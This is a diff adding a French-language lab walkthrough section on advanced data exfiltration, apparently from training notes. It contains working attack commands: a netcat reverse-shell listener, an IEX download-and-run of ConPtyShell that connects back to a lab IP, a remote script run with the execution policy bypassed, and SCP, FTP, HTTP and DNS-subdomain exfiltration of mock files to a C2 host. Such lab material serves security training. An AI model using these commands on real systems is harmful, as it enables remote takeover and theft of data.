@@ -1538,7 +1538,175 @@ reset
 <pre><code>reveal-answer</code></pre>
 
   </div>
-  <div id="s16" class="content"><div class="section-title">XVI. Exfiltration – Advanced</div></div>
+  <div id="s16" class="content"><div class="section-title">XVI. Exfiltration – Advanced</div>
+  <h3>🖥️ Introduction</h3>
+
+<p>Obtenez le FQDN de la machine :</p>
+<pre><code>hostname -f</code></pre>
+
+<p>Dans ce cas particulier, la commande simple :</p>
+<pre><code>hostname</code></pre>
+
+<p>donne déjà le même résultat.</p>
+
+<hr>
+
+<h3>🎧 Écouter le Reverse Shell</h3>
+
+<p>Démarrez un listener :</p>
+
+<pre><code>nc -lnvp 8000</code></pre>
+
+<p>Une fois connecté via reverse shell, utilisez :</p>
+<pre><code>whoami</code></pre>
+
+<hr>
+
+<h3>📤 SSH Exfiltration</h3>
+
+<p>Exécutez le script de génération :</p>
+
+<pre><code>cd /home/terry
+python3 /home/terry/mock.py
+</code></pre>
+
+<p>
+  Le script génère le fichier :
+</p>
+
+<pre><code>/home/terry/mock_clients.csv</code></pre>
+
+<h4>➡️ Avant SCP : upgrade du reverse shell</h4>
+
+<pre><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
+
+<h4>➡️ Exfiltration par SCP</h4>
+
+<pre><code>scp /home/terry/mock_clients.csv student@c2.public.lab:/home/student/mock_clients.csv
+</code></pre>
+
+<p>Mot de passe :</p>
+<pre><code>student</code></pre>
+
+<hr>
+
+<h3>📁 FTP Exfiltration</h3>
+
+<h4>1️⃣ Connexion FTP</h4>
+
+<pre><code>ftp c2.public.lab</code></pre>
+
+<ul>
+  <li><b>Name :</b> student</li>
+  <li><b>Password :</b> student</li>
+</ul>
+
+<h4>2️⃣ Lister les répertoires</h4>
+<pre><code>ls -la</code></pre>
+
+<p>Le dossier racine n’est pas modifiable → utilisez un dossier accessible.</p>
+
+<h4>3️⃣ Upload du fichier</h4>
+<pre><code>put /home/terry/mock_clients.csv ./files/mock_clients.csv</code></pre>
+
+<hr>
+
+<h3>🌐 HTTP Exfiltration (Reverse Shell Powershell amélioré)</h3>
+
+<p>
+  Améliorer le reverse shell PowerShell permet :
+</p>
+<ul>
+  <li>d’utiliser CTRL+C sans perdre la session</li>
+  <li>de recevoir la sortie en temps réel</li>
+  <li>d’avoir une console stable (ConPty)</li>
+</ul>
+
+<h4>1️⃣ Listener HTTP sur C2</h4>
+
+<pre><code>stty raw -echo; (stty size; cat) | nc -lvnp 3001</code></pre>
+
+<h4>2️⃣ Sur la machine compromise :</h4>
+
+<pre><code>IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.6.1 3001
+</code></pre>
+
+<p>Ce script crée un reverse shell Windows moderne via ConPty.</p>
+
+<h4>⚠️ Erreur courante :</h4>
+
+<p>
+  <b>ERROR: File already exists or there was an error with the filename</b>
+</p>
+
+<p>Vérifiez :</p>
+
+<pre><code>/var/www/c2/uploads</code></pre>
+
+<p>Supprimez l'ancien fichier si nécessaire :</p>
+
+<pre><code>rm /var/www/c2/uploads/mock_patients.json</code></pre>
+
+<p>Le script d’upload est situé ici :</p>
+
+<pre><code>/var/www/c2/web-app/upload.php</code></pre>
+
+<hr>
+
+<h3>✔️ Solution – Génération & Upload HTTP</h3>
+
+<h4>1️⃣ Générer le fichier mock</h4>
+
+<pre><code>cd C:\Users\DomainAdmin\
+wget "https://c2.public.lab/mock_patients.ps1" -O "C:\Users\DomainAdmin\mock_patients.ps1"
+powershell.exe -ExecutionPolicy ByPass -File C:\Users\DomainAdmin\mock_patients.ps1
+</code></pre>
+
+<h4>2️⃣ Upload via PowerShell</h4>
+
+<pre><code>$FilePath = 'C:\Users\DomainAdmin\mock_patients.json';
+$URL = 'https://c2.public.lab/upload.php';
+$fileBytes = [System.IO.File]::ReadAllBytes($FilePath);
+$fileEnc = [System.Text.Encoding]::GetEncoding('UTF-8').GetString($fileBytes);
+$boundary = [System.Guid]::NewGuid().ToString(); 
+$LF = "`r`n";
+$bodyLines = (
+    "--$boundary",
+    "Content-Disposition: form-data; name=`"file`"; filename=`"mock_patients.json`"",
+    "Content-Type: application/octet-stream$LF",
+    $fileEnc,
+    "--$boundary--$LF"
+) -join $LF
+Invoke-RestMethod -Uri $URL -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
+</code></pre>
+
+<hr>
+
+<h3>📡 DNS Exfiltration – Encodage</h3>
+
+<p>Encodez une chaîne en Base64 :</p>
+
+<pre><code>[Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes('hello world!'))</code></pre>
+
+<hr>
+
+<h3>🌍 DNS Exfiltration – Requête</h3>
+
+<p>Depuis PowerShell :</p>
+
+<pre><code>nslookup aGVsbG8gd29ybGQh.c2.public.lab</code></pre>
+
+<hr>
+
+<h3>📥 DNS Exfiltration – Récupérer la donnée exfiltrée</h3>
+
+<p>Consultez les logs DNS :</p>
+
+<pre><code>/var/log/bind/bind.log</code></pre>
+
+<p>Trouvez la ligne contenant les données exfiltrées et répondez à la question.</p>
+
+  </div>
 
 </div>
 
